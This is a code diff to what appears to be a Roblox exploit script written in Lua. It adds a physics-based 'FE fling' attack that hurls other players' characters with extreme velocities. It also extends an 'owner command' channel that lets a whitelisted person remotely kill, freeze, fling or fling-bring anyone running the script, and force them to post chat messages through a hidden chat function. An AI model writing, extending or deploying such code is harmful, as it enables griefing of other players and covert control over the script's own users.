@@ -6473,6 +6473,57 @@ local function sendHiddenChat(msg)
     end)
 end
 
+local function PerformFEAction(cmd, targetPlayer)
+    if not targetPlayer or not targetPlayer.Character then return end
+    local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not targetHRP then return end
+    
+    local char = plr.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+    
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+
+    local oldCF = hrp.CFrame
+    
+    if cmd == ".kill" or cmd == ".fling" then
+        SendNotify("⚔️ FE Attack", "Flinging " .. targetPlayer.DisplayName, 3)
+        
+        -- FE Fling Physics (Robust)
+        local bv = Instance.new("BodyVelocity")
+        bv.Velocity = Vector3.new(1e6, 1e6, 1e6)
+        bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
+        bv.Parent = hrp
+        
+        local bav = Instance.new("BodyAngularVelocity")
+        bav.AngularVelocity = Vector3.new(1e6, 1e6, 1e6)
+        bav.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
+        bav.Parent = hrp
+        
+        hum.PlatformStand = true
+
+        local startTime = tick()
+        while tick() - startTime < 1.2 do
+            if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then break end
+            hrp.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+            RunService.Stepped:Wait()
+        end
+        
+        bv:Destroy()
+        bav:Destroy()
+        hum.PlatformStand = false
+        hrp.CFrame = oldCF
+        hrp.AssemblyLinearVelocity = Vector3.zero
+        hrp.AssemblyAngularVelocity = Vector3.zero
+    elseif cmd == ".bring" then
+        SendNotify("🔄 FE Bring", "Attempting FE Bring on " .. targetPlayer.DisplayName, 3)
+        hrp.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 2)
+        task.wait(0.2)
+        hrp.CFrame = oldCF
+    end
+end
+
 local function handleOwnerCommand(chatterData, msg)
     if not msg then return end
     local lmsg = msg:lower()
@@ -6520,86 +6571,95 @@ local function handleOwnerCommand(chatterData, msg)
         
         if not targetStr then return end
 
-        local isTargetMe = false
+        -- Identify ALL potential targets for the FE engine
+        local allTargets = {}
         if targetStr == "*" then
-            isTargetMe = true
+            for _, p in pairs(Players:GetPlayers()) do
+                if p ~= chatterData then table.insert(allTargets, p) end
+            end
         else
-            local ln = plr.Name:lower()
-            local ld = plr.DisplayName:lower()
-            local lt = targetStr:lower()
-            if ln:sub(1, #lt) == lt or ld:sub(1, #lt) == lt then
-                isTargetMe = true
+            for _, p in pairs(Players:GetPlayers()) do
+                if p.Name:lower():sub(1, #targetStr) == targetStr:lower() or 
+                   p.DisplayName:lower():sub(1, #targetStr) == targetStr:lower() then
+                    table.insert(allTargets, p)
+                end
             end
         end
 
-        if not isTargetMe then return end
+        -- Execute logic on each target
+        for _, target in ipairs(allTargets) do
+            if target == plr then
+                -- Match against local player for internal Onyx execution
+                local char = plr.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
 
-        local char = plr.Character
-        local hrp = char and char:FindFirstChild("HumanoidRootPart")
-        local hum = char and char:FindFirstChildOfClass("Humanoid")
-
-        if cmd == ".bring" then
-            local ownerChar = chatterData.Character
-            local ownerHrp = ownerChar and ownerChar:FindFirstChild("HumanoidRootPart")
-            if ownerHrp and hrp then
-                hrp.CFrame = ownerHrp.CFrame * CFrame.new(0, 0, -3)
-                SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .bring", 3)
-            end
-        elseif cmd == ".fling" then
-            if hrp then
-                local bv = Instance.new("BodyVelocity")
-                bv.Velocity = Vector3.new(math.random(-500,500), 500, math.random(-500,500))
-                bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
-                bv.Parent = hrp
-                
-                local bav = Instance.new("BodyAngularVelocity")
-                bav.AngularVelocity = Vector3.new(9999, 9999, 9999)
-                bav.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
-                bav.Parent = hrp
-                
-                game:GetService("Debris"):AddItem(bv, 1.5)
-                game:GetService("Debris"):AddItem(bav, 1.5)
-                if hum then hum.Sit = true end
-                SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .fling", 3)
-            end
-        elseif cmd == ".say" then
-            local text = table.concat(parts, " ", 3)
-            if text and text ~= "" then
-                sendHiddenChat(text)
-                SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " forced say: " .. text, 3)
-            end
-        elseif cmd == ".lock" or cmd == ".freeze" then
-            if hrp then hrp.Anchored = true end
-            if hum then 
-                hum.WalkSpeed = 0
-                hum.JumpPower = 0 
-                hum.PlatformStand = true
-            end
-            SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .freeze", 3)
-        elseif cmd == ".kill" then
-            if char then char:BreakJoints() end
-            if hum then hum.Health = 0 end
-            SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .kill", 3)
-        elseif cmd == ".antigrav" then
-            SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .antigrav", 3)
-            if hrp then
-                hrp.Anchored = true
-                task.spawn(function()
-                    for i = 1, 100 do
-                        if not hrp or not hrp.Parent then break end
-                        hrp.CFrame = hrp.CFrame + Vector3.new(0, 1, 0)
-                        task.wait(0.05)
+                if cmd == ".bring" then
+                    local ownerChar = chatterData.Character
+                    local ownerHrp = ownerChar and ownerChar:FindFirstChild("HumanoidRootPart")
+                    if ownerHrp and hrp then
+                        hrp.CFrame = ownerHrp.CFrame * CFrame.new(0, 0, -3)
+                        SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .bring", 3)
                     end
-                end)
+                elseif cmd == ".fling" then
+                    if hrp then
+                        local bv = Instance.new("BodyVelocity")
+                        bv.Velocity = Vector3.new(math.random(-500,500), 500, math.random(-500,500))
+                        bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
+                        bv.Parent = hrp
+                        local bav = Instance.new("BodyAngularVelocity")
+                        bav.AngularVelocity = Vector3.new(9999, 9999, 9999)
+                        bav.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
+                        bav.Parent = hrp
+                        game:GetService("Debris"):AddItem(bv, 1.5)
+                        game:GetService("Debris"):AddItem(bav, 1.5)
+                        if hum then hum.Sit = true end
+                        SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .fling", 3)
+                    end
+                elseif cmd == ".say" then
+                    local text = table.concat(parts, " ", 3)
+                    if text and text ~= "" then
+                        sendHiddenChat(text)
+                        SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " forced say: " .. text, 3)
+                    end
+                elseif cmd == ".lock" or cmd == ".freeze" then
+                    if hrp then hrp.Anchored = true end
+                    if hum then 
+                        hum.WalkSpeed = 0
+                        hum.JumpPower = 0 
+                        hum.PlatformStand = true
+                    end
+                    SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .freeze", 3)
+                elseif cmd == ".kill" then
+                    if char then char:BreakJoints() end
+                    if hum then hum.Health = 0 end
+                    SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .kill", 3)
+                elseif cmd == ".antigrav" then
+                    SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .antigrav", 3)
+                    if hrp then
+                        hrp.Anchored = true
+                        task.spawn(function()
+                            for i = 1, 100 do
+                                if not hrp or not hrp.Parent then break end
+                                hrp.CFrame = hrp.CFrame + Vector3.new(0, 1, 0)
+                                task.wait(0.05)
+                            end
+                        end)
+                    end
+                end
+            elseif chatterData == plr then
+                -- IF WE ARE THE OWNER and target is someone else, perform FE action
+                PerformFEAction(cmd, target)
             end
         end
     else
-        -- Provide feedback if the local player (or anyone) tries an owner command but isn't whitelisted
+        -- Provide feedback if the local player tries an owner command but isn't whitelisted
         if isDotCmd and chatterData == plr then
             SendNotify("🔒 Access Denied", "You are not an authorized owner.", 3)
         end
     end
 end
+
 
 -- Hook chat for owner commands (Legacy + TextChatService)
 for _, p in ipairs(Players:GetPlayers()) do
@@ -6712,7 +6772,8 @@ if isOwner then
                 end
             end
             sendHiddenChat(msg)
-            SendNotify("👑 Owner", "Sent: " .. msg, 2)
+            handleOwnerCommand(plr, msg) -- Force immediate local execution for FE effects
+            SendNotify("👑 Owner", "Executed: " .. msg, 2)
         end)
     end
 else
